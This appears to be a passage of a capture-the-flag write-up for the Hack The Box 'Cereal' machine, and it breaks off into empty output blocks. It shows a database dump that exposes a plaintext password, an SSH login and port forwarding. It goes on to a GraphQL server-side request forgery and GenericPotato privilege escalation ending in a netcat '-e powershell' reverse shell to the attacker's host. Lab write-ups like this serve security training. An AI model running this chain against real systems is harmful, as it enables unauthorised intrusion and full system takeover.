+files that and in 'db' so instead we rename the file with 'txt' extension instead of db
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/cereal/www]
+└──╼ $wget -k https://source.cereal.htb/uploads/cereal.db.txt --no-check-certificate 
+--2021-06-09 21:31:44--  https://source.cereal.htb/uploads/cereal.db.txt
+Resolving source.cereal.htb (source.cereal.htb)... 10.10.10.217
+Connecting to source.cereal.htb (source.cereal.htb)|10.10.10.217|:443... connected.
+WARNING: The certificate of ‘source.cereal.htb’ is not trusted.
+WARNING: The certificate of ‘source.cereal.htb’ doesn't have a known issuer.
+HTTP request sent, awaiting response... 200 OK
+Length: 24576 (24K) [text/plain]
+Saving to: ‘cereal.db.txt’
+
+cereal.db.txt                      100%[==============================================================>]  24.00K  --.-KB/s    in 0.001s  
+
+2021-06-09 21:31:45 (19.3 MB/s) - ‘cereal.db.txt’ saved [24576/24576]
+
+Converted links in 0 files in 0 seconds.
+=====================================================================================================================================
+
+Now that we have donwloaded it we can use sqlite3 to dump the contents
+Commands and Output:
+=====================================================================================================================================
+└──╼ $sqlite3 cereal.db.txt
+SQLite version 3.34.1 2021-01-20 14:10:07
+Enter ".help" for usage hints.
+sqlite> .dump
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE IF NOT EXISTS "__EFMigrationsHistory" (
+	"MigrationId"	TEXT NOT NULL,
+	"ProductVersion"	TEXT NOT NULL,
+	CONSTRAINT "PK___EFMigrationsHistory" PRIMARY KEY("MigrationId")
+);
+INSERT INTO __EFMigrationsHistory VALUES('20191105055735_InitialCreate','3.0.0');
+CREATE TABLE IF NOT EXISTS "Requests" (
+	"RequestId"	INTEGER NOT NULL,
+	"JSON"	TEXT NOT NULL,
+	CONSTRAINT "PK_Requests" PRIMARY KEY("RequestId" AUTOINCREMENT)
+);
+CREATE TABLE IF NOT EXISTS "Users" (
+	"UserId"	INTEGER NOT NULL,
+	"Username"	TEXT NOT NULL,
+	"Password"	TEXT NOT NULL,
+	"Token"	TEXT,
+	CONSTRAINT "PK_Users" PRIMARY KEY("UserId" AUTOINCREMENT)
+);
+INSERT INTO Users VALUES(1,'sonny','mutual.madden.manner38974',NULL);
+DELETE FROM sqlite_sequence;
+INSERT INTO sqlite_sequence VALUES('Users',1);
+INSERT INTO sqlite_sequence VALUES('Requests',12)
+=====================================================================================================================================
+
+And we find what is most likley the username of sonny and the password "mutual.madden.manner38974"
+
+Since we saw that ssh was open let's try those creds and see if we can get in that way.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/cereal/www]
+└──╼ $ssh sonny@10.10.10.217
+The authenticity of host '10.10.10.217 (10.10.10.217)' can't be established.
+ECDSA key fingerprint is SHA256:j7rObutTScUnzggauxyxay7x3XgYCUgvLf4HV1XxS+A.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.217' (ECDSA) to the list of known hosts.
+sonny@10.10.10.217's password: 
+
+Microsoft Windows [Version 10.0.17763.1817]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+sonny@CEREAL C:\Users\sonny>whoami
+cereal\sonny
+=====================================================================================================================================
+
+Indeed we get in. Now we try basic enumeration
+Commands and Output:
+=====================================================================================================================================
+PS C:\Users\sonny\Desktop> get-computerinfo 
+
+
+WindowsBuildLabEx                                       : 17763.1.amd64fre.rs5_release.180914-1434 
+WindowsCurrentVersion                                   : 6.3
+WindowsEditionId                                        : ServerStandard
+WindowsInstallationType                                 : Server Core
+WindowsInstallDateFromRegistry                          : 11/11/2020 9:47:32 PM
+WindowsProductId                                        : 00429-00521-62775-AA529
+WindowsProductName                                      : Windows Server 2019 Standard
+WindowsRegisteredOrganization                           : 
+WindowsRegisteredOwner                                  : Windows User
+WindowsSystemRoot                                       : C:\Windows
+WindowsVersion                                          : 1809
+=====================================================================================================================================
+
+We find that the windows version running in 2019
+Commands and Output:
+=====================================================================================================================================
+PS C:\Users\sonny\Desktop> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name    SID
+============ ==============================================
+cereal\sonny S-1-5-21-1433318354-2681105707-1558593885-1000
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= =======
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+=====================================================================================================================================
+
+We see that we hvae the SE impersonate privilege mean we could easily run roguepotatoe to get system. However is we test to see if
+we can get outbound traffic to port 135 we notice that it is blocked by the system
+Commands and Output:
+=====================================================================================================================================
+PS C:\Users\sonny\Desktop> wget http://10.10.14.28:135/test
+wget : Unable to connect to the remote server 
+At line:1 char:1
++ wget http://10.10.14.28:135/test
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+=====================================================================================================================================
+
+If we do a netstat we see there is a service running on port 8080
+Commands and Output:
+=====================================================================================================================================
+PS C:\Users\sonny\Desktop> netstat -an
+
+Active Connections 
+
+  Proto  Local Address          Foreign Address        State
+  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:8172           0.0.0.0:0              LISTENING 
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING
+  TCP    10.10.10.217:22        10.10.14.28:47476      ESTABLISHED
+  TCP    10.10.10.217:139       0.0.0.0:0              LISTENING 
+  TCP    127.0.0.1:443          127.0.0.1:49895        ESTABLISHED
+  TCP    127.0.0.1:49668        0.0.0.0:0              LISTENING
+  TCP    127.0.0.1:49672        0.0.0.0:0              LISTENING
+  TCP    127.0.0.1:49672        127.0.0.1:49675        ESTABLISHED
+  TCP    127.0.0.1:49672        127.0.0.1:49676        ESTABLISHED
+  TCP    127.0.0.1:49672        127.0.0.1:49678        ESTABLISHED
+  TCP    127.0.0.1:49675        127.0.0.1:49672        ESTABLISHED 
+  TCP    127.0.0.1:49676        127.0.0.1:49672        ESTABLISHED
+  TCP    127.0.0.1:49678        127.0.0.1:49672        ESTABLISHED
+  TCP    127.0.0.1:49895        127.0.0.1:443          ESTABLISHED
+  TCP    [::]:22                [::]:0                 LISTENING
+  TCP    [::]:80                [::]:0                 LISTENING
+  TCP    [::]:135               [::]:0                 LISTENING
+  TCP    [::]:443               [::]:0                 LISTENING
+  TCP    [::]:445               [::]:0                 LISTENING
+  TCP    [::]:5985              [::]:0                 LISTENING
+  TCP    [::]:8080              [::]:0                 LISTENING
+  TCP    [::]:8172              [::]:0                 LISTENING
+  TCP    [::]:47001             [::]:0                 LISTENING
+  TCP    [::]:49664             [::]:0                 LISTENING
+  TCP    [::]:49665             [::]:0                 LISTENING
+  TCP    [::]:49666             [::]:0                 LISTENING
+  TCP    [::]:49667             [::]:0                 LISTENING
+  TCP    [::]:49671             [::]:0                 LISTENING
+  TCP    [::1]:49668            [::]:0                 LISTENING
+  TCP    [::1]:49892            [::1]:49668            TIME_WAIT
+  TCP    [::1]:49893            [::1]:49668            TIME_WAIT
+  TCP    [::1]:49894            [::1]:49668            TIME_WAIT
+  TCP    [::1]:49897            [::1]:49668            TIME_WAIT
+  UDP    0.0.0.0:123            *:*
+  UDP    0.0.0.0:5353           *:*
+  UDP    0.0.0.0:5353           *:*
+  UDP    10.10.10.217:137       *:*
+  UDP    10.10.10.217:138       *:*
+  UDP    127.0.0.1:59520        *:*
+  UDP    [::]:123               *:*
+  UDP    [::]:5353              *:*
+=====================================================================================================================================
+We can see that all those ports are listening however the firewall is preventing outside access.
+Instead we can use the power off ssh to forward the ports and see what we can find
+Commands and Output:
+=====================================================================================================================================┌─[user@parrot-virtual]─[~/htb/cereal]
+└──╼ $ssh sonny@10.10.10.217 -L 8080:127.0.0.1:8080
+
+..
+..
+..
+
+
+Manufacturing Plant Status
+# 	Location 	Status
+1	707 Antarctic Lane	OPERATIONAL
+2	221b Cereal Street	HALTED
+=====================================================================================================================================
+We see the output above if we navigate to 127.0.0.1 8080, if we go to our browser and check out web developer tools and use the 
+network tab we can see the different request being made and files. One that sticks out if the "graphql", we can see that it is 
+going to http://127.0.0.1:8080/api/graphql 
+
+We need to download and install some package from online to be able to play with graphql
+Commands and Output:
+=====================================================================================================================================sudo apt install libappindicator1
+sudo dpkg --install graphql-playground-electron_1.8.10_amd64.deb
+=====================================================================================================================================
+Once we have it installed we can run it and run queries within the pop up playground
+Commands and Output:
+====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/cereal/www]
+└──╼ $graphql-playground-electron
+
+..
+..
+..
+{
+  allCereals{
+    id
+    ingredients
+    name
+  }
+
+=====================================================================================================================================
+
+We can create a bucnh fo queries, however, after furhter exploration in the DOCS section under queries in the 'updatePlant' query
+there is a 'sourceURL' argument which allows us to make http requests, which is a server side request vulnerability.
+
+We can write a mutation to make requests.
+Commands and Output:
+====================================================================================================================================
+mutation{
+  updatePlant(plantId:1, version:1.1, sourceURL:"http://10.10.14.28")
+}
+=====================================================================================================================================
+We then hit play using the 'playground' and we listen with netcat on port 80 and we get a connect back.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/cereal/www]
+└──╼ $sudo nc -lnvp 80
+[sudo] password for user: 
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.10.217.
+Ncat: Connection from 10.10.10.217:51647.
+GET / HTTP/1.1
+Host: 10.10.14.28
+Connection: Keep-Alive
+
+
+=====================================================================================================================================
+This is where the application generic potatoe comes into play and we will have to build it from scratch within a windows box to run.
+Commands and Output:
+=====================================================================================================================================PS C:\Users\commando\source\repos> ls
+
+
+    Directory: C:\Users\commando\source\repos
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        5/26/2021  10:37 AM                2017-0213
+d-----         6/8/2021   4:03 PM                cereal
+d-----         6/8/2021   4:00 PM                CerealJWT
+d-----        11/9/2020   9:16 PM                LoadDriver
+-a----        11/9/2020   9:17 PM              0 User.Sid
+
+
+PS C:\Users\commando\source\repos> git clone https://github.com/micahvandeusen/GenericPotato.git
+Cloning into 'GenericPotato'...
+remote: Enumerating objects: 489, done.
+remote: Counting objects: 100% (489/489), done.
+remote: Compressing objects: 100% (267/267), done.
+Receiving objects:  96% (470/489)used 481 (delta 218), pack-reused 0R
+Receiving objects: 100% (489/489), 801.64 KiB | 6.03 MiB/s, done.
+Resolving deltas: 100% (226/226), done.
+
+=====================================================================================================================================
+The generic potato will get an http request direct it over to winrm and ask the client to do ntlm authentication and this is where
+we can still a token and use SEImpersonate Privilege for a service.
+Commands and Output:
+=====================================================================================================================================Rebuild started...
+1>------ Rebuild All started: Project: NtApiDotNet, Configuration: Release Any CPU ------
+1>  NtApiDotNet -> C:\Users\commando\source\repos\GenericPotato\NtApiDotNet\bin\Release\NtApiDotNet.dll
+2>------ Rebuild All started: Project: GenericPotato, Configuration: Release Any CPU ------
+2>  GenericPotato -> C:\Users\commando\source\repos\GenericPotato\bin\Release\GenericPotato.exe
+========== Rebuild All: 2 succeeded, 0 failed, 0 skipped ==========
+=====================================================================================================================================
+We can now quicly create an smb service to copy it quickly
+Commands and Output:
+=====================================================================================================================================┌─[✗]─[user@parrot-virtual]─[~/htb/cereal/smb]
+└──╼ $sudo !!
+sudo impacket-smbserver -smb2support -u testing -password testing testing $(pwd)
+
+..
+..
+..
+ON WINDOWS
+PS C:\Users\commando\source\repos> cp C:\Users\commando\source\repos\GenericPotato\bin\Release\GenericPotato.exe \\192.168.33.7\testing
+=====================================================================================================================================
+We now have to copy it to the server, this can be done with wget from the ssh user shell
+Commands and Output:
+=====================================================================================================================================sonny@CEREAL c:\ProgramData>powershell wget 10.10.14.28/GenericPotato.exe -o gp.exe
+=====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+sonny@CEREAL c:\ProgramData>.\gp.exe
+GenericPotato by @micahvandeusen 
+  Modified from SweetPotato by @_EthicalChaos_
+
+[+] Starting named pipe at \\Cereal\pipe\test 
+[+] Listener ready
+
+...
+...
+...
+
+sonny@CEREAL c:\ProgramData>.\gp.exe -h
+GenericPotato by @micahvandeusen
+  Modified from SweetPotato by @_EthicalChaos_
+
+  -m, --method=VALUE         Auto,User,Thread (default Auto)
+  -p, --prog=VALUE           Program to launch (default cmd.exe)
+  -a, --args=VALUE           Arguments for program (default null)
+  -e, --exploit=VALUE        Exploit mode [HTTP|NamedPipe(default)]
+  -l, --port=VALUE           HTTP port to listen on (default 8888)
+  -i, --host=VALUE           HTTP host to listen on (default 127.0.0.1)
+  -h, --help                 Display this help
+=====================================================================================================================================
+So what this program will do is execute any program we speciy in our case we may want to transfer over a netcat exe that we can use
+Commands and Output:
+====================================================================================================================================
+sonny@CEREAL c:\ProgramData>powershell wget 10.10.14.28/nc.exe -o nc.exe
+..
+..
+..
+PS C:\ProgramData> .\nc.exe -h
+[v1.10 NT]
+connect to somewhere:   nc [-options] hostname port[s] [ports] ...
+listen for inbound:     nc -l -p port [options] [hostname] [port]
+options:
+        -d              detach from console, stealth mode
+
+        -e prog         inbound program to exec [dangerous!!]
+        -g gateway      source-routing hop point[s], up to 8
+        -G num          source-routing pointer: 4, 8, 12, ...
+        -h              this cruft
+        -i secs         delay interval for lines sent, ports scanned
+        -l              listen mode, for inbound connects
+        -L              listen harder, re-listen on socket close
+        -n              numeric-only IP addresses, no DNS
+        -o file         hex dump of traffic
+        -p port         local port number
+        -r              randomize local and remote ports
+        -s addr         local source address
+        -t              answer TELNET negotiation
+        -u              UDP mode
+        -v              verbose [use twice to be more verbose]
+        -w secs         timeout for connects and final net reads
+        -z              zero-I/O mode [used for scanning]
+port numbers can be individual or ranges: m-n [inclusive]
+====================================================================================================================================
+
+With that ou of the way we can run generic potatoe which will run on localhost port 8888 by default which will be listening, from 
+the graphql play ground we will make a request to that port and then generic potato will use this to grab the request and create
+token with the SEImpersonate Privilege to get system on the windows box and send it back via netcat.
+Commands and Output:
+====================================================================================================================================
+graphql-playground-electron
+..
+..
+..
+
+PS C:\ProgramData> .\gp.exe -e HTTP -p c:\ProgramData\nc.exe -a "10.10.14.28 80 -e powershell"
+GenericPotato by @micahvandeusen
+  Modified from SweetPotato by @_EthicalChaos_
+
+[+] Starting HTTP listener on port http://127.0.0.1:8888
+[+] Listener ready
+Request for: /
+Client: NT AUTHORITY\SYSTEM
+[+] Duplicated impersonation token ready for process creation
+[+] Intercepted and authenticated successfully, launching c:\ProgramData\nc.exe
+[+] Running "c:\ProgramData\nc.exe" 10.10.14.28 80 -e powershell
+[+] Process created, enjoy!
+
+..
+..
+..
+GRAPHQL PLAYGROUND REQUEST:
+mutation{
+  updatePlant(plantId:1, version:1.1, sourceURL:"http://127.0.0.1:8888/")
+}
+
+..
+..
+..
+NETCAT Reverse Shell:
+┌─[user@parrot-virtual]─[~/htb/cereal/www]
+└──╼ $sudo nc -lnvp 80
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.10.217.
+Ncat: Connection from 10.10.10.217:51732.
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+whoami
+nt authority\system
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
